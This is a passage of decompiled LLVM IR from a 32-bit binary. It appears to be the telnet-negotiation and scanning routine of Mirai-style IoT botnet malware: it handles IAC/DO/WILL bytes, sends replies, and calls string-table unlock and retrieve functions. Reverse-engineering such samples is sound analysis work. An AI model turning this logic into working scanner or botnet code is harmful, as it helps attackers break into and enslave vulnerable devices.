  %v0_804fe22 = phi i32 [ %v0_804fd8c98, %dec_label_pc_804fd87.preheader ], [ %v1_804fdfc, %dec_label_pc_804fde2 ]
  %v0_804fd87 = load i32, i32* @ebx, align 4
  %v1_804fd87 = inttoptr i32 %v0_804fd87 to i8*
  %v2_804fd87 = load i8, i8* %v1_804fd87, align 1
  %v12_804fd87 = icmp eq i8 %v2_804fd87, -1
  %v1_804fd8a = icmp eq i1 %v12_804fd87, false
  br i1 %v1_804fd8a, label %dec_label_pc_804fe03, label %dec_label_pc_804fd8c

dec_label_pc_804fd8c:                             ; preds = %dec_label_pc_804fd87
  %v1_804fd8c = add i32 %v0_804fe22, 24
  %v2_804fd8c = inttoptr i32 %v1_804fd8c to i32*
  %v3_804fd8c = load i32, i32* %v2_804fd8c, align 4
  %v1_804fd90 = add i32 %v0_804fd87, 1
  store i32 %v1_804fd90, i32* @edi, align 4
  %v2_804fd93 = add i32 %v3_804fd8c, %v1_804fd93
  store i32 %v2_804fd93, i32* %ecx.global-to-local, align 4
  %tmp315 = icmp ugt i32 %v2_804fd93, %v1_804fd90
  br i1 %tmp315, label %dec_label_pc_804fd99, label %dec_label_pc_804fe03

dec_label_pc_804fd99:                             ; preds = %dec_label_pc_804fd8c
  %v2_804fd99 = inttoptr i32 %v1_804fd90 to i8*
  %v3_804fd99 = load i8, i8* %v2_804fd99, align 1
  %v4_804fd99 = zext i8 %v3_804fd99 to i32
  %v6_804fd99 = and i32 %v5_804fd99, -256
  %v7_804fd99 = or i32 %v4_804fd99, %v6_804fd99
  store i32 %v7_804fd99, i32* %eax.global-to-local, align 4
  %v11_804fd9c = icmp eq i8 %v3_804fd99, -1
  br i1 %v11_804fd9c, label %dec_label_pc_804fe17, label %dec_label_pc_804fda0

dec_label_pc_804fda0:                             ; preds = %dec_label_pc_804fd99
  %v11_804fda0 = icmp eq i8 %v3_804fd99, -3
  br i1 %v11_804fda0, label %dec_label_pc_804fe22, label %dec_label_pc_804fda4

dec_label_pc_804fda4:                             ; preds = %dec_label_pc_804fda0
  %v1_804fda4 = add i32 %v0_804fd87, 2
  store i32 %v1_804fda4, i32* %eax.global-to-local, align 4
  %tmp316 = icmp ugt i32 %v2_804fd93, %v1_804fda4
  br i1 %tmp316, label %dec_label_pc_804fdab, label %dec_label_pc_804fe03

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fda4, %dec_label_pc_804fe96
  %v4_804fdab = phi i32 [ %v2_804fe8c, %dec_label_pc_804fe96 ], [ %v1_804fda4, %dec_label_pc_804fda4 ]
  %v0_804fee1 = phi i32 [ %v0_804fe89, %dec_label_pc_804fe96 ], [ %v0_804fd87, %dec_label_pc_804fda4 ]
  %v1_804fdab = inttoptr i32 %v0_804fee1 to i8*
  %v2_804fdab = load i8, i8* %v1_804fdab, align 1
  %v3_804fdab = zext i8 %v2_804fdab to i32
  %v5_804fdab = and i32 %v4_804fdab, -256
  %v6_804fdab = or i32 %v3_804fdab, %v5_804fdab
  store i32 %v6_804fdab, i32* %eax.global-to-local, align 4
  %v11_804fdad = icmp eq i8 %v2_804fdab, -3
  br i1 %v11_804fdad, label %dec_label_pc_804fee1, label %dec_label_pc_804fdb5

dec_label_pc_804fdb5:                             ; preds = %dec_label_pc_804fdab
  %v11_804fdb5 = icmp eq i8 %v2_804fdab, -5
  br i1 %v11_804fdb5, label %dec_label_pc_804ff0d, label %dec_label_pc_804fdbd

dec_label_pc_804fdbd:                             ; preds = %dec_label_pc_804fdb5, %dec_label_pc_804ff0d
  %v4_804fdbd = phi i32 [ %v6_804fdab, %dec_label_pc_804fdb5 ], [ %v4_804fdbd.pre, %dec_label_pc_804ff0d ]
  %v0_804fdbd = load i32, i32* @edi, align 4
  %v1_804fdbd = inttoptr i32 %v0_804fdbd to i8*
  %v2_804fdbd = load i8, i8* %v1_804fdbd, align 1
  %v3_804fdbd = zext i8 %v2_804fdbd to i32
  %v5_804fdbd = and i32 %v4_804fdbd, -256
  %v6_804fdbd = or i32 %v3_804fdbd, %v5_804fdbd
  store i32 %v6_804fdbd, i32* %eax.global-to-local, align 4
  %v11_804fdbf = icmp eq i8 %v2_804fdbd, -3
  br i1 %v11_804fdbf, label %dec_label_pc_804feee, label %dec_label_pc_804fdc7

dec_label_pc_804fdc7:                             ; preds = %dec_label_pc_804fee1, %dec_label_pc_804fdbd
  %v0_804ff05 = phi i32 [ %v0_804fee4, %dec_label_pc_804fee1 ], [ %v0_804fdbd, %dec_label_pc_804fdbd ]
  %v0_804fdc7 = phi i32 [ %v6_804fee4, %dec_label_pc_804fee1 ], [ %v6_804fdbd, %dec_label_pc_804fdbd ]
  %v1_804fdc7 = trunc i32 %v0_804fdc7 to i8
  %v11_804fdc7 = icmp eq i8 %v1_804fdc7, -5
  br i1 %v11_804fdc7, label %dec_label_pc_804ff05, label %dec_label_pc_804fdcf

dec_label_pc_804fdcf:                             ; preds = %dec_label_pc_804fdc7, %dec_label_pc_804ff05
  %v5_804fdcf = phi i32 [ %v0_804fdc7, %dec_label_pc_804fdc7 ], [ %v5_804fdcf.pre, %dec_label_pc_804ff05 ]
  %v0_804fdcf = load i32, i32* @ebx, align 4
  %v1_804fdcf = add i32 %v0_804fdcf, 2
  %v2_804fdcf = inttoptr i32 %v1_804fdcf to i8*
  %v3_804fdcf = load i8, i8* %v2_804fdcf, align 1
  %v4_804fdcf = zext i8 %v3_804fdcf to i32
  %v6_804fdcf = and i32 %v5_804fdcf, -256
  %v7_804fdcf = or i32 %v4_804fdcf, %v6_804fdcf
  store i32 %v7_804fdcf, i32* %eax.global-to-local, align 4
  %v11_804fdd2 = icmp eq i8 %v3_804fdcf, -3
  br i1 %v11_804fdd2, label %dec_label_pc_804fefc, label %dec_label_pc_804fdda

dec_label_pc_804fdda:                             ; preds = %dec_label_pc_804feee, %dec_label_pc_804fdcf
  %v0_804ff15 = phi i32 [ %v0_804fef1, %dec_label_pc_804feee ], [ %v0_804fdcf, %dec_label_pc_804fdcf ]
  %v0_804fdda = phi i32 [ %v7_804fef1, %dec_label_pc_804feee ], [ %v7_804fdcf, %dec_label_pc_804fdcf ]
  %v1_804fdda = trunc i32 %v0_804fdda to i8
  %v11_804fdda = icmp eq i8 %v1_804fdda, -5
  br i1 %v11_804fdda, label %dec_label_pc_804ff15, label %dec_label_pc_804fde2

dec_label_pc_804fde2:                             ; preds = %dec_label_pc_804fdda, %dec_label_pc_804ff15, %dec_label_pc_804fefc
  %v0_804fde2 = load i32, i32* @esp, align 4
  %v1_804fde2 = add i32 %v0_804fde2, -4
  %v2_804fde2 = inttoptr i32 %v1_804fde2 to i32*
  store i32 16384, i32* %v2_804fde2, align 4
  %v1_804fde7 = add i32 %v0_804fde2, -8
  %v2_804fde7 = inttoptr i32 %v1_804fde7 to i32*
  store i32 3, i32* %v2_804fde7, align 4
  %v0_804fde9 = load i32, i32* @ebx, align 4
  %v2_804fde9 = add i32 %v0_804fde2, -12
  %v3_804fde9 = inttoptr i32 %v2_804fde9 to i32*
  store i32 %v0_804fde9, i32* %v3_804fde9, align 4
  %v0_804fdea = load i32, i32* @ebp, align 4
  %v1_804fdea = add i32 %v0_804fdea, 3
  store i32 %v1_804fdea, i32* @ebp, align 4
  %v0_804fded = load i32, i32* @esi, align 4
  %v1_804fded = add i32 %v0_804fded, 4
  %v2_804fded = inttoptr i32 %v1_804fded to i32*
  %v3_804fded = load i32, i32* %v2_804fded, align 4
  store i32 %v3_804fded, i32* %eax.global-to-local, align 4
  %v0_804fdf0 = load i32, i32* @ebx, align 4
  %v1_804fdf0 = add i32 %v0_804fdf0, 3
  store i32 %v1_804fdf0, i32* @ebx, align 4
  %v2_804fdf3 = add i32 %v0_804fde2, -16
  %v3_804fdf3 = inttoptr i32 %v2_804fdf3 to i32*
  store i32 %v3_804fded, i32* %v3_804fdf3, align 4
  %v0_804fdf4 = load i32, i32* %stack_var_-16, align 4
  %v4_804fdf4 = call i32 @__libc_send(i32 %v0_804fdf4, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fdf4, i32* %eax.global-to-local, align 4
  %v0_804fdf9 = load i32, i32* @esi, align 4
  %v1_804fdf9 = add i32 %v0_804fdf9, 24
  %v2_804fdf9 = inttoptr i32 %v1_804fdf9 to i32*
  %v3_804fdf9 = load i32, i32* %v2_804fdf9, align 4
  store i32 %v3_804fdf9, i32* %edx.global-to-local, align 4
  %v0_804fdfc = load i32, i32* @esp, align 4
  %v1_804fdfc = add i32 %v0_804fdfc, 16
  %v0_804fdff = load i32, i32* @ebp, align 4
  %v2_804fdff = sub i32 %v0_804fdff, %v3_804fdf9
  %v8_804fdff = xor i32 %v0_804fdff, %v3_804fdf9
  %v9_804fdff = xor i32 %v2_804fdff, %v0_804fdff
  %v10_804fdff = and i32 %v9_804fdff, %v8_804fdff
  %v11_804fdff = icmp slt i32 %v10_804fdff, 0
  %v13_804fdff = icmp slt i32 %v2_804fdff, 0
  %v2_804fe01 = icmp eq i1 %v13_804fdff, %v11_804fdff
  br i1 %v2_804fe01, label %dec_label_pc_804fe03, label %dec_label_pc_804fd87

dec_label_pc_804fe03:                             ; preds = %dec_label_pc_804fd83.backedge, %dec_label_pc_804fda4, %dec_label_pc_804fd8c, %dec_label_pc_804fde2, %dec_label_pc_804fd87, %dec_label_pc_804fe22.dec_label_pc_804fe03.loopexit_crit_edge
  %v0_804fe0b = phi i32 [ %v0_804fe86, %dec_label_pc_804fe22.dec_label_pc_804fe03.loopexit_crit_edge ], [ %v0_804fdf9, %dec_label_pc_804fde2 ], [ %v0_804fe0b126, %dec_label_pc_804fda4 ], [ %v0_804fe0b126, %dec_label_pc_804fd8c ], [ %v0_804fe0b126, %dec_label_pc_804fd87 ], [ %v0_804fe0b125, %dec_label_pc_804fd83.backedge ]
  %v0_804fe03 = phi i32 [ %v0_804fe03.pre.pre, %dec_label_pc_804fe22.dec_label_pc_804fe03.loopexit_crit_edge ], [ %v0_804fdff, %dec_label_pc_804fde2 ], [ %v0_804fe1a, %dec_label_pc_804fda4 ], [ %v0_804fe1a, %dec_label_pc_804fd8c ], [ %v0_804fe1a, %dec_label_pc_804fd87 ], [ %v0_804fd83, %dec_label_pc_804fd83.backedge ]
  %tmp174 = icmp slt i32 %v0_804fe03, 1
  br i1 %tmp174, label %dec_label_pc_804fcb3, label %dec_label_pc_804fe0b

dec_label_pc_804fe0b:                             ; preds = %dec_label_pc_804fe03
  %v1_804fe0b = add i32 %v0_804fe0b, 12
  %v2_804fe0b = inttoptr i32 %v1_804fe0b to i32*
  store i32 3, i32* %v2_804fe0b, align 4
  br label %dec_label_pc_804fcb3

dec_label_pc_804fe17:                             ; preds = %dec_label_pc_804fd99
  %v1_804fe17 = add i32 %v0_804fd87, 2
  store i32 %v1_804fe17, i32* @ebx, align 4
  %v1_804fe1a = add i32 %v0_804fe1a, 2
  store i32 %v1_804fe1a, i32* @ebp, align 4
  br label %dec_label_pc_804fd83.backedge

dec_label_pc_804fd83.backedge:                    ; preds = %dec_label_pc_804fe17, %dec_label_pc_804fea0
  %v0_804fe0b125 = phi i32 [ %v0_804fe0b126, %dec_label_pc_804fe17 ], [ %v0_804fed6, %dec_label_pc_804fea0 ]
  %v1_804fd83 = phi i32 [ %v1_804fd93, %dec_label_pc_804fe17 ], [ %v3_804fed6, %dec_label_pc_804fea0 ]
  %v0_804fd83 = phi i32 [ %v1_804fe1a, %dec_label_pc_804fe17 ], [ %v0_804fd83.pre, %dec_label_pc_804fea0 ]
  %v5_804fd99104 = phi i32 [ %v7_804fd99, %dec_label_pc_804fe17 ], [ %v4_804fed1, %dec_label_pc_804fea0 ]
  %v0_804fd8c99 = phi i32 [ %v0_804fe22, %dec_label_pc_804fe17 ], [ %v1_804fed9, %dec_label_pc_804fea0 ]
  %v2_804fd83 = sub i32 %v0_804fd83, %v1_804fd83
  %v8_804fd83 = xor i32 %v0_804fd83, %v1_804fd83
  %v9_804fd83 = xor i32 %v2_804fd83, %v0_804fd83
  %v10_804fd83 = and i32 %v9_804fd83, %v8_804fd83
  %v11_804fd83 = icmp slt i32 %v10_804fd83, 0
  %v13_804fd83 = icmp slt i32 %v2_804fd83, 0
  %v2_804fd85 = icmp eq i1 %v13_804fd83, %v11_804fd83
  br i1 %v2_804fd85, label %dec_label_pc_804fe03, label %dec_label_pc_804fd87.preheader

dec_label_pc_804fe22:                             ; preds = %dec_label_pc_804fda0
  %v1_804fe22 = add i32 %v0_804fe22, 1879
  %v2_804fe22 = inttoptr i32 %v1_804fe22 to i8*
  store i8 -1, i8* %v2_804fe22, align 1
  %v0_804fe2a = load i32, i32* @esp, align 4
  %v1_804fe2a = add i32 %v0_804fe2a, 1880
  %v2_804fe2a = inttoptr i32 %v1_804fe2a to i8*
  store i8 -5, i8* %v2_804fe2a, align 1
  %v0_804fe32 = load i32, i32* @esp, align 4
  %v1_804fe32 = add i32 %v0_804fe32, 1881
  %v2_804fe32 = inttoptr i32 %v1_804fe32 to i8*
  store i8 31, i8* %v2_804fe32, align 1
  %v0_804fe3a = load i32, i32* @esp, align 4
  %v1_804fe3a = add i32 %v0_804fe3a, 1847
  %v2_804fe3a = inttoptr i32 %v1_804fe3a to i8*
  store i8 -1, i8* %v2_804fe3a, align 1
  %v0_804fe42 = load i32, i32* @esp, align 4
  %v1_804fe42 = add i32 %v0_804fe42, 1848
  %v2_804fe42 = inttoptr i32 %v1_804fe42 to i8*
  store i8 -6, i8* %v2_804fe42, align 1
  %v0_804fe4a = load i32, i32* @esp, align 4
  %v1_804fe4a = add i32 %v0_804fe4a, 1849
  %v2_804fe4a = inttoptr i32 %v1_804fe4a to i8*
  store i8 31, i8* %v2_804fe4a, align 1
  %v0_804fe52 = load i32, i32* @esp, align 4
  %v1_804fe52 = add i32 %v0_804fe52, 1850
  %v2_804fe52 = inttoptr i32 %v1_804fe52 to i8*
  store i8 0, i8* %v2_804fe52, align 1
  %v0_804fe5a = load i32, i32* @esp, align 4
  %v1_804fe5a = add i32 %v0_804fe5a, 1851
  %v2_804fe5a = inttoptr i32 %v1_804fe5a to i8*
  store i8 80, i8* %v2_804fe5a, align 1
  %v0_804fe62 = load i32, i32* @esp, align 4
  %v1_804fe62 = add i32 %v0_804fe62, 1852
  %v2_804fe62 = inttoptr i32 %v1_804fe62 to i8*
  store i8 0, i8* %v2_804fe62, align 1
  %v0_804fe6a = load i32, i32* @esp, align 4
  %v1_804fe6a = add i32 %v0_804fe6a, 1853
  %v2_804fe6a = inttoptr i32 %v1_804fe6a to i8*
  store i8 24, i8* %v2_804fe6a, align 1
  %v0_804fe72 = load i32, i32* @esp, align 4
  %v1_804fe72 = add i32 %v0_804fe72, 1854
  %v2_804fe72 = inttoptr i32 %v1_804fe72 to i8*
  store i8 -1, i8* %v2_804fe72, align 1
  %v0_804fe7a = load i32, i32* @esp, align 4
  %v1_804fe7a = add i32 %v0_804fe7a, 1855
  %v2_804fe7a = inttoptr i32 %v1_804fe7a to i8*
  store i8 -16, i8* %v2_804fe7a, align 1
  %v0_804fe82 = load i32, i32* @esp, align 4
  %v1_804fe82 = add i32 %v0_804fe82, 24
  %v2_804fe82 = inttoptr i32 %v1_804fe82 to i32*
  %v3_804fe82 = load i32, i32* %v2_804fe82, align 4
  store i32 %v3_804fe82, i32* %eax.global-to-local, align 4
  %v0_804fe86 = load i32, i32* @esi, align 4
  %v1_804fe86 = add i32 %v0_804fe86, 24
  %v2_804fe86 = inttoptr i32 %v1_804fe86 to i32*
  %v3_804fe86 = load i32, i32* %v2_804fe86, align 4
  store i32 %v3_804fe86, i32* %ecx.global-to-local, align 4
  %v0_804fe89 = load i32, i32* @ebx, align 4
  %v1_804fe89 = add i32 %v0_804fe89, 2
  store i32 %v1_804fe89, i32* %edx.global-to-local, align 4
  %v2_804fe8c = add i32 %v3_804fe86, %v3_804fe82
  store i32 %v2_804fe8c, i32* %eax.global-to-local, align 4
  %tmp317 = icmp ugt i32 %v2_804fe8c, %v1_804fe89
  br i1 %tmp317, label %dec_label_pc_804fe96, label %dec_label_pc_804fe22.dec_label_pc_804fe03.loopexit_crit_edge

dec_label_pc_804fe22.dec_label_pc_804fe03.loopexit_crit_edge: ; preds = %dec_label_pc_804fe22
  %v0_804fe03.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fe03

dec_label_pc_804fe96:                             ; preds = %dec_label_pc_804fe22
  %v2_804fe96 = inttoptr i32 %v1_804fe89 to i8*
  %v3_804fe96 = load i8, i8* %v2_804fe96, align 1
  %v12_804fe96 = icmp eq i8 %v3_804fe96, 31
  %v1_804fe9a = icmp eq i1 %v12_804fe96, false
  br i1 %v1_804fe9a, label %dec_label_pc_804fdab, label %dec_label_pc_804fea0

dec_label_pc_804fea0:                             ; preds = %dec_label_pc_804fe96
  %v1_804fea0 = add i32 %v0_804fe82, -4
  %v2_804fea0 = inttoptr i32 %v1_804fea0 to i32*
  store i32 16384, i32* %v2_804fea0, align 4
  %v1_804fea5 = add i32 %v0_804fe82, -8
  %v2_804fea5 = inttoptr i32 %v1_804fea5 to i32*
  store i32 3, i32* %v2_804fea5, align 4
  %v1_804fea7 = add i32 %v0_804fe82, 1879
  store i32 %v1_804fea7, i32* %edx.global-to-local, align 4
  %v0_804feae = load i32, i32* @ebx, align 4
  %v1_804feae = add i32 %v0_804feae, 3
  store i32 %v1_804feae, i32* @ebx, align 4
  %v2_804feb1 = add i32 %v0_804fe82, -12
  %v3_804feb1 = inttoptr i32 %v2_804feb1 to i32*
  store i32 %v1_804fea7, i32* %v3_804feb1, align 4
  %v0_804feb2 = load i32, i32* @ebp, align 4
  %v1_804feb2 = add i32 %v0_804feb2, 3
  store i32 %v1_804feb2, i32* @ebp, align 4
  %v0_804feb5 = load i32, i32* @esi, align 4
  %v1_804feb5 = add i32 %v0_804feb5, 4
  %v2_804feb5 = inttoptr i32 %v1_804feb5 to i32*
  %v3_804feb5 = load i32, i32* %v2_804feb5, align 4
  store i32 %v3_804feb5, i32* %ecx.global-to-local, align 4
  %v2_804feb8 = add i32 %v0_804fe82, -16
  %v3_804feb8 = inttoptr i32 %v2_804feb8 to i32*
  store i32 %v3_804feb5, i32* %v3_804feb8, align 4
  %v0_804feb9 = load i32, i32* %stack_var_-16, align 4
  %v4_804feb9 = call i32 @__libc_send(i32 %v0_804feb9, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804feb9, i32* %eax.global-to-local, align 4
  %v0_804febe = load i32, i32* @esp, align 4
  %v1_804febe = add i32 %v0_804febe, -4
  %v2_804febe = inttoptr i32 %v1_804febe to i32*
  store i32 16384, i32* %v2_804febe, align 4
  %v1_804fec3 = add i32 %v0_804febe, -8
  %v2_804fec3 = inttoptr i32 %v1_804fec3 to i32*
  store i32 9, i32* %v2_804fec3, align 4
  %v1_804fec5 = add i32 %v0_804febe, 1863
  store i32 %v1_804fec5, i32* %ecx.global-to-local, align 4
  %v2_804fecc = add i32 %v0_804febe, -12
  %v3_804fecc = inttoptr i32 %v2_804fecc to i32*
  store i32 %v1_804fec5, i32* %v3_804fecc, align 4
  %v0_804fecd = load i32, i32* @esi, align 4
  %v1_804fecd = add i32 %v0_804fecd, 4
  %v2_804fecd = inttoptr i32 %v1_804fecd to i32*
  %v3_804fecd = load i32, i32* %v2_804fecd, align 4
  store i32 %v3_804fecd, i32* %edx.global-to-local, align 4
  %v2_804fed0 = add i32 %v0_804febe, -16
  %v3_804fed0 = inttoptr i32 %v2_804fed0 to i32*
  store i32 %v3_804fecd, i32* %v3_804fed0, align 4
  %v0_804fed1 = load i32, i32* %stack_var_-16, align 4
  %v4_804fed1 = call i32 @__libc_send(i32 %v0_804fed1, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fed1, i32* %eax.global-to-local, align 4
  %v0_804fed6 = load i32, i32* @esi, align 4
  %v1_804fed6 = add i32 %v0_804fed6, 24
  %v2_804fed6 = inttoptr i32 %v1_804fed6 to i32*
  %v3_804fed6 = load i32, i32* %v2_804fed6, align 4
  store i32 %v3_804fed6, i32* %edx.global-to-local, align 4
  %v0_804fed9 = load i32, i32* @esp, align 4
  %v1_804fed9 = add i32 %v0_804fed9, 32
  %v0_804fd83.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fd83.backedge

dec_label_pc_804fee1:                             ; preds = %dec_label_pc_804fdab
  store i8 -4, i8* %v1_804fdab, align 1
  %v0_804fee4 = load i32, i32* @edi, align 4
  %v1_804fee4 = inttoptr i32 %v0_804fee4 to i8*
  %v2_804fee4 = load i8, i8* %v1_804fee4, align 1
  %v3_804fee4 = zext i8 %v2_804fee4 to i32
  %v4_804fee4 = load i32, i32* %eax.global-to-local, align 4
  %v5_804fee4 = and i32 %v4_804fee4, -256
  %v6_804fee4 = or i32 %v5_804fee4, %v3_804fee4
  store i32 %v6_804fee4, i32* %eax.global-to-local, align 4
  %v11_804fee6 = icmp eq i8 %v2_804fee4, -3
  %v1_804fee8 = icmp eq i1 %v11_804fee6, false
  br i1 %v1_804fee8, label %dec_label_pc_804fdc7, label %dec_label_pc_804feee

dec_label_pc_804feee:                             ; preds = %dec_label_pc_804fee1, %dec_label_pc_804fdbd
  %v0_804feee = phi i32 [ %v0_804fee4, %dec_label_pc_804fee1 ], [ %v0_804fdbd, %dec_label_pc_804fdbd ]
  %v1_804feee = inttoptr i32 %v0_804feee to i8*
  store i8 -4, i8* %v1_804feee, align 1
  %v0_804fef1 = load i32, i32* @ebx, align 4
  %v1_804fef1 = add i32 %v0_804fef1, 2
  %v2_804fef1 = inttoptr i32 %v1_804fef1 to i8*
  %v3_804fef1 = load i8, i8* %v2_804fef1, align 1
  %v4_804fef1 = zext i8 %v3_804fef1 to i32
  %v5_804fef1 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fef1 = and i32 %v5_804fef1, -256
  %v7_804fef1 = or i32 %v6_804fef1, %v4_804fef1
  store i32 %v7_804fef1, i32* %eax.global-to-local, align 4
  %v11_804fef4 = icmp eq i8 %v3_804fef1, -3
  %v1_804fef6 = icmp eq i1 %v11_804fef4, false
  br i1 %v1_804fef6, label %dec_label_pc_804fdda, label %dec_label_pc_804fefc

dec_label_pc_804fefc:                             ; preds = %dec_label_pc_804feee, %dec_label_pc_804fdcf
  %v0_804fefc = phi i32 [ %v0_804fef1, %dec_label_pc_804feee ], [ %v0_804fdcf, %dec_label_pc_804fdcf ]
  %v1_804fefc = add i32 %v0_804fefc, 2
  %v2_804fefc = inttoptr i32 %v1_804fefc to i8*
  store i8 -4, i8* %v2_804fefc, align 1
  br label %dec_label_pc_804fde2

dec_label_pc_804ff05:                             ; preds = %dec_label_pc_804fdc7
  %v1_804ff05 = inttoptr i32 %v0_804ff05 to i8*
  store i8 -3, i8* %v1_804ff05, align 1
  %v5_804fdcf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdcf

dec_label_pc_804ff0d:                             ; preds = %dec_label_pc_804fdb5
  store i8 -3, i8* %v1_804fdab, align 1
  %v4_804fdbd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdbd

dec_label_pc_804ff15:                             ; preds = %dec_label_pc_804fdda
  %v1_804ff15 = add i32 %v0_804ff15, 2
  %v2_804ff15 = inttoptr i32 %v1_804ff15 to i8*
  store i8 -3, i8* %v2_804ff15, align 1
  br label %dec_label_pc_804fde2

dec_label_pc_804ffc3:                             ; preds = %dec_label_pc_804f760
  %v1_804f78d = icmp eq i32 %v0_804f785, 0
  br i1 %v1_804f78d, label %dec_label_pc_80503f3, label %dec_label_pc_804ffc9

dec_label_pc_804ffc9:                             ; preds = %dec_label_pc_804ffc3
  %v10_804ffc9 = icmp eq i32 %v0_804f785, -1
  %v1_804ffcc = icmp eq i1 %v10_804ffc9, false
  br i1 %v1_804ffcc, label %dec_label_pc_804f7a7, label %dec_label_pc_804ffd2

dec_label_pc_804ffd2:                             ; preds = %dec_label_pc_804ffc9
  %v1_804ffd2 = add i32 %v0_804f78a, 56
  %v2_804ffd2 = inttoptr i32 %v1_804ffd2 to i32*
  %v3_804ffd2 = load i32, i32* %v2_804ffd2, align 4
  store i32 %v3_804ffd2, i32* @eax, align 4
  %v1_804ffd6 = inttoptr i32 %v3_804ffd2 to i32*
  %v2_804ffd6 = load i32, i32* %v1_804ffd6, align 4
  %v11_804ffd6 = icmp eq i32 %v2_804ffd6, 11
  br i1 %v11_804ffd6, label %dec_label_pc_804fcc6, label %dec_label_pc_804ffdf

dec_label_pc_804ffdf:                             ; preds = %dec_label_pc_804ffd2, %dec_label_pc_80503f3
  %v0_804ffdf = phi i32 [ %v1_804f78a, %dec_label_pc_804ffd2 ], [ %v0_804ffdf.pre, %dec_label_pc_80503f3 ]
  %v0_804ffe2 = load i32, i32* @esi, align 4
  %v1_804ffe2 = add i32 %v0_804ffe2, 4
  %v2_804ffe2 = inttoptr i32 %v1_804ffe2 to i32*
  %v3_804ffe2 = load i32, i32* %v2_804ffe2, align 4
  %v2_804ffe5 = add i32 %v0_804ffdf, -16
  %v3_804ffe5 = inttoptr i32 %v2_804ffe5 to i32*
  store i32 %v3_804ffe2, i32* %v3_804ffe5, align 4
  %v0_804ffe6 = load i32, i32* %stack_var_-16, align 4
  %v1_804ffe6 = call i32 @__GI___libc_close(i32 %v0_804ffe6)
  store i32 %v1_804ffe6, i32* %eax.global-to-local, align 4
  %v0_804ffeb = load i32, i32* @esi, align 4
  %v1_804ffeb = add i32 %v0_804ffeb, 284
  %v2_804ffeb = inttoptr i32 %v1_804ffeb to i8*
  %v3_804ffeb = load i8, i8* %v2_804ffeb, align 1
  %v4_804ffeb = zext i8 %v3_804ffeb to i32
  %v6_804ffeb = and i32 %v1_804ffe6, -256
  %v7_804ffeb = or i32 %v4_804ffeb, %v6_804ffeb
  %v1_804fff4 = add i32 %v7_804ffeb, 1
  store i32 %v1_804fff4, i32* %eax.global-to-local, align 4
  %v1_804fff5 = add i32 %v0_804ffeb, 4
  %v2_804fff5 = inttoptr i32 %v1_804fff5 to i32*
  store i32 -1, i32* %v2_804fff5, align 4
  %v0_804fffc = load i32, i32* %eax.global-to-local, align 4
  %v1_804fffc = trunc i32 %v0_804fffc to i8
  %v2_804fffc = load i32, i32* @esi, align 4
  %v3_804fffc = add i32 %v2_804fffc, 284
  %v4_804fffc = inttoptr i32 %v3_804fffc to i8*
  store i8 %v1_804fffc, i8* %v4_804fffc, align 1
  %v0_8050002 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050002 = trunc i32 %v0_8050002 to i8
  %tmp318 = icmp ult i8 %v1_8050002, 10
  %v0_8050402 = load i32, i32* @esi, align 4
  br i1 %tmp318, label %dec_label_pc_8050402, label %dec_label_pc_805000a

dec_label_pc_805000a:                             ; preds = %dec_label_pc_804ffdf
  %v1_805000a = add i32 %v0_8050402, 284
  %v2_805000a = inttoptr i32 %v1_805000a to i8*
  store i8 0, i8* %v2_805000a, align 1
  %v0_8050011 = load i32, i32* @esi, align 4
  %v1_8050011 = add i32 %v0_8050011, 12
  %v2_8050011 = inttoptr i32 %v1_8050011 to i32*
  store i32 0, i32* %v2_8050011, align 4
  br label %dec_label_pc_804fcc6

dec_label_pc_805002c:                             ; preds = %dec_label_pc_804fc68, %dec_label_pc_804fc2c
  %v0_805002c = load i32, i32* @esp, align 4
  %v1_805002f = add i32 %v0_805002c, -16
  %v2_805002f = inttoptr i32 %v1_805002f to i32*
  store i32 31, i32* %v2_805002f, align 4
  %v0_8050031 = load i32, i32* %stack_var_-16, align 4
  %v1_8050031 = trunc i32 %v0_8050031 to i8
  %v2_8050031 = call i32 @table_unlock_val(i8 %v1_8050031)
  store i32 %v2_8050031, i32* %eax.global-to-local, align 4
  %v0_8050036 = load i32, i32* @esp, align 4
  %v1_8050036 = inttoptr i32 %v0_8050036 to i32*
  %v3_8050036 = add i32 %v0_8050036, 4
  %v1_8050037 = inttoptr i32 %v3_8050036 to i32*
  %v1_8050038 = add i32 %v0_8050036, 1884
  store i32 %v1_8050038, i32* %edx.global-to-local, align 4
  store i32 %v1_8050038, i32* %v1_8050037, align 4
  store i32 31, i32* %v1_8050036, align 4
  %v0_8050042 = load i32, i32* %stack_var_-16, align 4
  %v3_8050042 = call i32 @table_retrieve_val(i32 %v0_8050042, i32* %v2_8050185)
  store i32 %v3_8050042, i32* %eax.global-to-local, align 4
  %v0_8050047 = load i32, i32* @esp, align 4
  %v1_8050047 = add i32 %v0_8050047, 1884
  %v2_8050047 = inttoptr i32 %v1_8050047 to i32*
  %v3_8050047 = load i32, i32* %v2_8050047, align 4
  %v1_805004e = add i32 %v3_8050047, -1
  store i32 %v1_805004e, i32* %edx.global-to-local, align 4
  %v2_805004f = add i32 %v0_8050047, -4
  %v3_805004f = inttoptr i32 %v2_805004f to i32*
  store i32 %v1_805004e, i32* %v3_805004f, align 4
  %v2_8050050 = add i32 %v0_8050047, -8
  %v3_8050050 = inttoptr i32 %v2_8050050 to i32*
  store i32 %v3_8050042, i32* %v3_8050050, align 4
  %v0_8050051 = load i32, i32* @esi, align 4
  %v1_8050051 = add i32 %v0_8050051, 24
  %v2_8050051 = inttoptr i32 %v1_8050051 to i32*
  %v3_8050051 = load i32, i32* %v2_8050051, align 4
  store i32 %v3_8050051, i32* @ebx, align 4
  %v2_8050054 = add i32 %v0_8050047, -12
  %v3_8050054 = inttoptr i32 %v2_8050054 to i32*
  store i32 %v3_8050051, i32* %v3_8050054, align 4
  %v1_8050055 = add i32 %v0_8050047, 40
  %v2_8050055 = inttoptr i32 %v1_8050055 to i32*
  %v3_8050055 = load i32, i32* %v2_8050055, align 4
  store i32 %v3_8050055, i32* %ecx.global-to-local, align 4
